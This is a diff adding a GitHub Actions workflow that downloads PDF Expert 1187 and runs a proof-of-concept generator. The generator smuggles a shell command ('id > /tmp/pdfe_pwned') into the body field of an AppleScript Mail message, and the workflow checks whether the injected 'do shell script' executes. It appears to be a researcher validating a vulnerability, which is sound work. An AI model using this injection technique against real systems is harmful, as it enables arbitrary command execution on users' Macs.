@@ -1,0 +1,80 @@
+name: pdfexpert-verify
+
+on:
+  workflow_dispatch:
+
+jobs:
+  v:
+    runs-on: macos-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Fetch PDF Expert 1187 and regenerate
+        run: |
+          set -euo pipefail
+          curl -fsSL -o pex.zip https://downloads.pdfexpert.com/pem3/versions/1187/PDFExpert.zip
+          shasum -a 256 pex.zip
+          unzip -q pex.zip -d app
+          python3 poc/gen_poc.py --binary "app/PDF Expert.app/Contents/MacOS/PDF Expert" --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
+          grep -n 'new outgoing message' generated.scpt
+
+      - name: A - exact generated expression, no Mail, bare record literal
+        run: |
+          set +e
+          rm -f /tmp/pdfe_nomail
+          python3 - <<'PY'
+          gen = open('generated.scpt').read()
+          line = [l for l in gen.splitlines() if 'new outgoing message' in l][0]
+          expr = line.split('properties {', 1)[1].rstrip('}')
+          open('nomail.scpt', 'w').write('set r to {' + expr + '}\nreturn content of r\n')
+          print('NOMAIL LINE:', open('nomail.scpt').read().splitlines()[0])
+          PY
+          osacompile -o /tmp/nm.scptd nomail.scpt && echo "NOMAIL COMPILE OK" || echo "NOMAIL COMPILE FAILED"
+          START=$(date +%s)
+          osascript nomail.scpt > nm.out 2>&1 &
+          PID=$!
+          for i in $(seq 1 60); do [ -s /tmp/pdfe_nomail ] && break; sleep 1; done
+          kill $PID 2>/dev/null; wait $PID 2>/dev/null
+          echo "NOMAIL ELAPSED: $(( $(date +%s) - START ))s"
+          echo "NOMAIL OUT: [$(cat nm.out)]"
+          if [ -s /tmp/pdfe_nomail ]; then echo "NOMAIL PROOF: executed"; echo "NOMAIL MARKER: [$(cat /tmp/pdfe_nomail)]"; else echo "NOMAIL PROOF: none"; fi
+
+      - name: B - full generated script, 180s window, report whether Mail came up
+        run: |
+          set +e
+          rm -f /tmp/pdfe_pwned
+          START=$(date +%s)
+          osascript generated.scpt > osa.out 2>&1 &
+          PID=$!
+          MAILUP=no
+          for i in $(seq 1 180); do
+            [ -s /tmp/pdfe_pwned ] && break
+            pgrep -x Mail >/dev/null && MAILUP=yes
+            sleep 1
+          done
+          ALIVE=no
+          kill -0 $PID 2>/dev/null && ALIVE=yes
+          echo "B ELAPSED: $(( $(date +%s) - START ))s osascript_alive=$ALIVE mail_process=$MAILUP"
+          kill $PID 2>/dev/null; wait $PID 2>/dev/null
+          echo "B OUT: [$(cat osa.out)]"
+          if [ -s /tmp/pdfe_pwned ]; then echo "B PROOF: do shell script executed"; echo "B MARKER: [$(cat /tmp/pdfe_pwned)]"; else echo "B PROOF: none"; fi
+
+      - name: C - bare do shell script as an operand, paren vs no paren
+        run: |
+          set +e
+          echo 'set a to "x" & do shell script "echo hi" & "y"' > c1.scpt
+          osacompile -o /tmp/c1.scptd c1.scpt && echo "C1 COMPILE OK" || echo "C1 COMPILE FAILED"
+          echo "C1 OUT: [$(osascript c1.scpt 2>&1)]"
+          echo 'set a to "x" & (do shell script "echo hi") & "y"' > c2.scpt
+          echo "C2 OUT: [$(osascript c2.scpt 2>&1)]"
+
+      - name: Collect
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: verify
+          path: |
+            generated.scpt
+            nomail.scpt
+            *.out
